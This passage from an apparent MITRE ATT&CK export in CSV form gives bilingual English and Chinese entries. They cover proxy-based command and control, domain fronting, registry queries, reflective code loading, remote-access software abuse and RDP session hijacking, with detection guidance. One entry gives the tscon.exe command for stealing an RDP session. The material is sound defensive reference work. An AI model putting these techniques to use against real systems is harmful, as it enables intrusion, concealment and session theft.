ZXPortMap。 （引用：趋势科技 APT 攻击工具）攻击者使用这些类型的代理来管理命令和控制通信，减少同时出站网络连接的数量，在连接丢失时提供弹性，或者绕过受害者之间现有的可信通信路径以免被怀疑。攻击者可能会将多个代理链接在一起，以进一步掩饰恶意流量的来源。攻击者还可以利用内容交付网络 (CDN) 中的路由方案来代理命令和控制流量。
T1090.004,Proxy: Domain Fronting,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",https://attack.mitre.org/techniques/T1090/004,14 March 2020,16 September 2020,1.1,Command and Control,"If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1090,,"Matt Kelly, @breakersall",,,,CAPEC-481,,,"(Citation: FireEye SMOKEDHAM June 2021),(Citation: Mythc Documentation),(Citation: Mandiant No Easy Breach),(Citation: Cobalt Strike Manual 4.3 November 2020),",代理：域前端,攻击者可能会利用内容交付网络 (CDN) 和其他托管多个域的服务中的路由方案来混淆 HTTPS 流量或通过 HTTPS 隧道传输的流量的预期目的地。 （引用： Fifield Blocking Resistent Communication through domain fronting 2015） 域前端涉及在 TLS 标头的 SNI 字段和 HTTP 标头的 Host 字段中使用不同的域名。如果两个域都由同一个 CDN 提供服务，则 CDN 可能会在解开 TLS 标头后路由到 HTTP 标头中指定的地址。该技术的一种变体，“无域”前端，利用了一个留空的 SNI 字段；即使 CDN 尝试验证 SNI 和 HTTP 主机字段匹配（如果空白 SNI 字段被忽略），这也可能允许前端工作。例如，如果 domain-x 和 domain-y 是同一个 CDN 的客户，则可以将 domain-x 放在 TLS 标头中，将 domain-y 放在 HTTP 标头中。流量似乎会流向域-x，但 CDN 可能会将其路由到域-y。
T1090.002,Proxy: External Proxy,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.

External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",https://attack.mitre.org/techniques/T1090/002,14 March 2020,27 March 2020,1.0,Command and Control,"Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1090,,,,,,,,,"(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Reaqta MuddyWater November 2017),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: ESET InvisiMole June 2020),(Citation: BitDefender Chafer May 2020),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye APT28),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: FireEye MuddyWater Mar 2018),(Citation: FireEye APT10 Sept 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: FOX-IT May 2016 Mofang),(Citation: Novetta Winnti April 2015),(Citation: TrendMicro Tonto Team October 2020),(Citation: Group IB Silence Sept 2018),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: ESET Okrum July 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: FireEye APT10 April 2017),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Mythc Documentation),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Kaspersky Regin),(Citation: Symantec MuddyWater Dec 2018),(Citation: FireEye Operation Double Tap),(Citation: University of Birmingham C2)",代理：外部代理,攻击者可以使用外部代理充当与命令和控制服务器进行网络通信的中介，以避免直接连接到他们的基础设施。存在许多通过代理或端口重定向实现流量重定向的工具，包括 [HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy 和 ZXPortMap。 （引用：趋势科技 APT 攻击工具）攻击者使用这些类型的代理来管理命令和控制通信，在连接丢失时提供弹性，或者绕过现有的可信通信路径以避免怀疑。外部连接代理用于屏蔽 C2 流量的目的地，通常使用端口重定向器实现。受害环境之外的受损系统以及购买的基础设施（例如基于云的资源或虚拟专用服务器）可能用于这些目的。可以根据从受感染系统到代理的连接被调查的可能性较低来选择代理。受害者系统将直接与 Internet 上的外部代理通信，然后代理将通信转发到 C2 服务器。
T1090.001,Proxy: Internal Proxy,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.

By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",https://attack.mitre.org/techniques/T1090/001,14 March 2020,15 March 2020,1.0,Command and Control,Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2),"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1090,,,,,,,,,"(Citation: Kaspersky ProjectSauron Blog),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Zscaler Higaisa 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: FireEye APT30),(Citation: FoxIT Wocao December 2019),(Citation: FireEye APT39 Jan 2019),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Symantec W32.Duqu),(Citation: Symantec RAINDROP January 2021),(Citation: BitDefender Chafer May 2020),(Citation: ESET InvisiMole June 2018),(Citation: ESET Sednit Part 2),(Citation: NSA/FBI Drovorub August 2020),(Citation: Novetta Winnti April 2015),(Citation: cobaltstrike manual),(Citation: Novetta-Axiom),(Citation: ESET Dukes October 2019),(Citation: Accenture HyperStack October 2020),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Mythc Documentation),(Citation: ClearkSky Fox Kitten February 2020),(Citation: Check Point Pay2Key November 2020),(Citation: Talos TinyTurla September 2021),(Citation: University of Birmingham C2)",代理：内部代理,攻击者可能会使用内部代理来指挥和控制受感染环境中两个或多个系统之间的流量。存在许多通过代理或端口重定向实现流量重定向的工具，包括 [HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy 和 ZXPortMap。 （引用：趋势科技 APT 攻击工具）攻击者使用内部代理来管理受感染环境中的命令和控制通信，以减少同时出站网络连接的数量，在连接丢失时提供弹性，或绕过现有的受信任的受感染系统之间的通信路径，以避免怀疑。内部代理连接可以使用常见的对等 (p2p) 网络协议，例如 SMB，以更好地融入环境。通过使用受感染的内部系统作为代理，攻击者可以隐藏 C2 流量的真实目的地，同时减少与外部系统的大量连接的需求。
T1090.003,Proxy: Multi-hop Proxy,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)

In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",https://attack.mitre.org/techniques/T1090/003,14 March 2020,21 October 2020,2.0,Command and Control,"When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.

In context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.","Linux, Network, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1090,,,,,,,,,"(Citation: ProofPoint Ursnif Aug 2016),(Citation: MSTIC Nobelium Oct 2021),(Citation: NCSC CISA Cyclops Blink Advisory February 2022),(Citation: Symantec Inception Framework March 2018),(Citation: FoxIT Wocao December 2019),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: objsee mac malware 2017),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Checkpoint Dridex Jan 2021),(Citation: Dingledine Tor The Second-Generation Onion Router),(Citation: synack 2016 review),(Citation: Bitdefender StrongPity June 2020),(Citation: SecureWorks WannaCry Analysis),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: ESET Kobalos Jan 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: ESET Attor Oct 2019),(Citation: NJCCIC Ursnif Sept 2016),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET GreyEnergy Oct 2018),(Citation: Dragos Crashoverride 2017),(Citation: ESET Kobalos Feb 2021),(Citation: Mandiant No Easy Breach),",代理：多跳代理,为了掩饰恶意流量的来源，攻击者可能会将多个代理链接在一起。通常，防御者将能够在进入其网络之前识别最后经过的代理流量；在最后一跳代理之前，防御者可能识别也可能不识别任何先前的代理。该技术要求防御者通过多个代理跟踪恶意流量以识别其来源，从而使识别恶意流量的原始来源变得更加困难。这种行为的一个特定变体是使用洋葱路由网络，例如公开可用的 TOR 网络。 （引文：洋葱路由）在网络基础设施（尤其是路由器）的情况下，攻击者有可能利用多个受感染的设备在企业的广域网 (WAN) 内创建多跳代理链。通过利用 [Patch System Image](https://attack.mitre.org/techniques/T1601/001)，攻击者可以将自定义代码添加到受影响的网络设备中，从而在这些节点之间实现洋葱路由。这个定制的洋葱路由网络将通过受感染的人群传输加密的 C2 流量，允许攻击者与洋葱路由网络中的任何设备进行通信。此方法依赖于 [网络边界桥接](https://attack.mitre.org/techniques/T1599) 方法，以允许攻击者跨越 Internet 边界的受保护网络边界并进入组织的 WAN。诸如 ICMP 之类的协议可以用作传输。
T1012,Query Registry,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",https://attack.mitre.org/techniques/T1012,31 May 2017,26 March 2020,1.2,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Interaction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",Windows,"Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access",False,,,,"Administrator, SYSTEM, User",,,CAPEC-647,,,"(Citation: FireEye APT32 May 2017),(Citation: Trend Micro Waterbear December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: FoxIT Wocao December 2019),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: RATANKBA),(Citation: FinFisher Citation),(Citation: ESET OceanLotus Mar 2019),(Citation: ESET Sednit Part 2),(Citation: GitHub PowerSploit May 2012),(Citation: ESET Zebrocy May 2019),(Citation: Cybereason Bazar July 2020),(Citation: Novetta Blockbuster),(Citation: Symantec Hydraq Jan 2010),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Unit42 BendyBear Feb 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Trustwave Pillowmint June 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Sharpshooter December 2018),(Citation: CIRCL PlugX March 2013),(Citation: Cisco DNSMessenger March 2017),(Citation: Unit 42 Valak July 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: McAfee Gold Dragon),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Bisonal Mar 2020),(Citation: ESET Industroyer),(Citation: FireEye APT28),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: FireEye CARBANAK June 2017),(Citation: ESET Carbon Mar 2017),(Citation: McAfee GhostSecret),(Citation: Palo Alto Reaver Nov 2017),(Citation: PowerSploit Documentation),(Citation: Prevx Carberp March 2011),(Citation: Cybereason Cobalt Kitty 2017),(Citation: US-CERT TA18-074A),(Citation: Talent-Jump Clambling February 2020),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Crowdstrike Indrik November 2018),(Citation: Secureworks REvil September 2019),(Citation: Talos Group123),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Kaspersky Turla),(Citation: Symantec Buckeye),(Citation: ESET InvisiMole June 2018),(Citation: ESET ComRAT May 2020),(Citation: Trend Micro njRAT 2018),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Talos ZxShell Oct 2014),(Citation: Novetta Blockbuster Loaders),(Citation: Talos Kimsuky Nov 2021),(Citation: Securelist APT10 March 2021),(Citation: Kaspersky StoneDrill 2017),(Citation: ESET Dukes October 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: US-CERT Bankshot Dec 2017),(Citation: Talos TinyTurla September 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: CyberBit Dtrack),(Citation: ESET Gelsemium June 2021),(Citation: NCC Group WastedLocker June 2020),(Citation: Lastline PlugX Analysis),(Citation: FireEye APT30),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Gh0stRAT ATT March 2019),(Citation: Accenture Lyceum Targets November 2021),(Citation: Kaspersky WIRTE November 2021),(Citation: FireEye FELIXROOT July 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Unit42 BabyShark Feb 2019),(Citation: NCC Group Chimera January 2021),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ESET Attor Oct 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Microsoft Reg),(Citation: Microsoft FinFisher March 2018),",查询注册表,攻击者可能与 Windows 注册表交互以收集有关系统、配置和已安装软件的信息。注册表包含大量有关操作系统、配置、软件和安全性的信息。（引用：维基百科 Windows 注册表）可以使用 [Reg]（https://attack.mitre.org/software/）轻松查询信息S0075) 实用程序，尽管存在其他访问注册表的方法。其中一些信息可能有助于攻击者在网络中进一步开展行动。攻击者可以在自动发现期间使用来自 [Query Registry](https://attack.mitre.org/techniques/T1012) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或尝试特定行动。
T1620,Reflective Code Loading,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL)

Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",https://attack.mitre.org/techniques/T1620,05 October 2021,21 April 2022,1.0,Defense Evasion,"Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such as <code>Assembly.Load()</code> and [Native API](https://attack.mitre.org/techniques/T1106) functions such as <code>CreateThread()</code>, <code>memfd_create()</code>, <code>execve()</code>, and/or <code>execveat()</code>.(Citation: 00sec Droppers)(Citation: S1 Old Rat New Tricks)

Monitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe). Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes.(Citation: MDSec Detecting DOTNET)(Citation: Introducing Donut)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","Linux, Windows, macOS","Module: Module Load, Process: OS API Execution, Script: Script Execution",False,,"Anti-virus, Application control","Joas Antonio dos Santos, @C0d3Cr4zy, Inmetrics; João Paulo de A. Filho, @Hug1nN__; Lior Ribak, SentinelOne; Rex Guo, @Xiaofei_REX, Confluera; Shlomi Salem, SentinelOne",,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: PowerSploit Documentation),(Citation: wardle evilquest partii),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Cuba April 2021),(Citation: MSTIC FoggyWeb September 2021),(Citation: GitHub PowerSploit May 2012),(Citation: Talos Lokibot Jan 2021),(Citation: Donut Github),(Citation: CrowdStrike IceApple May 2022),(Citation: Lazarus APT January 2022),(Citation: Qualys LolZarus),",反射代码加载,攻击者可能会反射性地将代码加载到进程中，以隐藏恶意负载的执行。反射加载涉及直接在进程的内存中分配然后执行有效负载，即创建由磁盘上的文件路径支持的线程或进程。反射加载的有效负载可能是编译的二进制文件、匿名文件（仅存在于 RAM 中）或只是无文件可执行代码的怠慢（例如：与位置无关的 shellcode）。（引文：介绍甜甜圈）（引文：S1 自定义 Shellcode 工具）（引文： Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) 反射代码注入与 [Process Injection](https://attack.mitre.org/techniques/T1055) 非常相似，只是“注入”会加载代码进入进程自己的内存，而不是单独进程的内存。反射加载可能会逃避基于进程的检测，因为任意代码的执行可能会在合法或其他良性进程中被屏蔽。将有效负载直接反射式加载到内存中还可以避免在磁盘上创建文件或其他工件，同时还使恶意软件能够在执行之前对这些有效负载进行加密（或以其他方式进行混淆）。（引文：Stuart ELF Memory）（引文：00sec Droppers）（引文： Intezer ACBackdoor）（引用：S1 老老鼠新技巧）
T1219,Remote Access Software,"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.(Citation: Symantec Living off the Land)

Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).

Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)",https://attack.mitre.org/techniques/T1219,18 April 2018,21 April 2022,2.1,Command and Control,"Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.

[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",False,,,"Matt Kelly, @breakersall; Zachary Stanford, @svch0st",,,,,,,"(Citation: Securelist DarkVishnya Dec 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: Securelist Kimsuky Sept 2013),(Citation: Symantec Thrip June 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: ESET RTM Feb 2017),(Citation: US-CERT Ukraine Feb 2016),(Citation: McAfee Night Dragon),(Citation: PTSecurity Cobalt Dec 2016),(Citation: ESET Trickbot Oct 2020),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Unit 42 Hildegard Malware),(Citation: Anomali Static Kitten February 2021),(Citation: Bitdefender Trickbot March 2020),(Citation: FireEye CARBANAK June 2017),(Citation: Trend Micro Muddy Water March 2021),(Citation: ESET EvilNum July 2020),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Dell Dridex Oct 2015),(Citation: Group IB RTM August 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Cyble Egregor Oct 2020),(Citation: Group-IB Anunak),(Citation: DFIR Conti Bazar Nov 2021),",远程访问软件,攻击者可以使用合法的桌面支持和远程访问软件，例如 Team Viewer、AnyDesk、Go2Assist、LogMein、AmmyyAdmin 等，来建立一个交互式命令和控制通道，以连接网络内的目标系统。这些服务通常用作合法的技术支持软件，并且可能被目标环境中的应用程序控制所允许。与攻击者常用的其他合法软件相比，VNC、Ammyy 和 Teamviewer 等远程访问工具经常使用。（引文：赛门铁克在陆地上生活）可以安装远程访问工具并将其用作备用通信渠道，以实现冗余访问或作为与目标系统建立交互式远程桌面会话的一种方式。它们还可以用作恶意软件的一个组件，以建立反向连接或反向连接到服务或攻击者控制的系统。许多远程访问工具的安装还可能包括持久性（例如：该工具的安装例程会创建一个 [Windows 服务](https://attack.mitre.org/techniques/T1543/003)）。 TeamViewer 等管理工具已被多个团体使用，针对俄罗斯政府和犯罪活动感兴趣的国家/地区的机构。（引用：CrowdStrike 2015 全球威胁报告）（引用：CrySyS 博客 TeamSpy）
T1563,Remote Service Session Hijacking,"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.

Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)",https://attack.mitre.org/techniques/T1563,25 February 2020,23 March 2020,1.0,Lateral Movement,"Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

Monitor for processes and command-line arguments associated with hijacking service sessions.","Linux, Windows, macOS","Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",False,,,,"root, SYSTEM",,,,,,",",远程服务会话劫持,攻击者可能会控制与远程服务的预先存在的会话，以便在环境中横向移动。用户可以使用有效凭据登录专门设计用于接受远程连接的服务，例如 telnet、SSH 和 RDP。当用户登录到服务时，将建立一个会话，使他们能够与该服务保持持续的交互。攻击者可能会征用这些会话以在远程系统上执行操作。 [远程服务会话劫持](https://attack.mitre.org/techniques/T1563) 与 [远程服务](https://attack.mitre.org/techniques/T1021) 的使用不同，因为它劫持了现有会话而不是使用 [有效帐户]（https://attack.mitre.org/techniques/T1078）创建新会话。（引用：RDP 劫持媒介）（引用：Breach Post-mortem SSH Hijack）
T1563.002,Remote Service Session Hijacking: RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)",https://attack.mitre.org/techniques/T1563/002,25 February 2020,23 March 2020,1.0,Lateral Movement,"Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.

